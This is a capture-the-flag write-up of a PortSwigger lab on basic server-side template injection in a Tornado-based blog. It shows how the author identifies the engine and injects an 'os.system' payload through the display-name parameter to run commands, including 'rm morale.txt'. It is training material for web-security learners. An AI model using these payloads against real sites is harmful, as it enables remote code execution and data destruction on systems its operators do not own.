# Basic server-side template injection (code context)

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context), you'll learn: Basic server-side template injection (code context)! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to [server-side template injection](https://portswigger.net/web-security/server-side-template-injection) due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223024231.png)

First, let's **detect** is there any Server-Side Template Injection vulnerability.

**Post comment:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223024411.png)

Based on my experience, some **comments functionality** in a web page, **it might be using some template engine to render users' comment.**

**Let's try to fuzz that via Burp Suite!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223024649.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223025446.png)

Nope. I don't think it's vulnerable to SSTI.

**Let's login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223025535.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223025544.png)

In here, we can pick our preferred name.

**Let's try to submit it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223025751.png)

When we clicked `Submit` button, **it'll send a POST request to `/my-account/change-blog-post-author-display`, with parameter `blog-post-author-display` and `csrf`.**

**Let's try to post a comment in one of those blog posts:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223025940.png)

As you can see, when we posted a new comment, **our name will be rendered via the template!**

Since **the username can be controlled by an attacker**, it might vulnerable to SSTI.

**The template code might be:**
```py
blog-post-author-display = getQueryParameter('blog-post-author-display')
engine.render("Hello {{"+blog-post-author-display+"}}", data)
```

**If in that case, we can just close the template syntax: `}}`.**

**Let's try it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223030457.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223030509.png)

It worked!

**Let's do some maths:**
```
user.name}}-SSTI payload...{{7*7}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223030946.png)

> Note: The payload is URL encoded.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031003.png)

Nice!

Next, we need to which template engine is using.

**To do so, we can trigger an error:**
```
{{trigger_error}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031113.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031125.png)

In the error message, it's displaying a **template engine called `tornado`, which is written in Python!**

After Identified the template engine, we can go to the exploitation session!

**In the [Tornado documentation](https://www.tornadoweb.org/en/stable/template.html), we can import modules:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031519.png)

Since I'm quite familiar with Python, I knew that **we can import a module called `os`, which allows us to execute OS commands!**

**Payload:**
```
{% import os %}{{os.system("cmd_here")}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031757.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031804.png)

**Nice! Let's delete `morale.txt` file:**
```
{% import os %}{{os.system("ls")}}
{% import os %}{{os.system("rm morale.txt")}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031915.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223031923.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223032019.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Template-Injection/SSTI-2/images/Pasted%20image%2020221223032026.png)

We did it!

# What we've learned:

1. Basic server-side template injection (code context)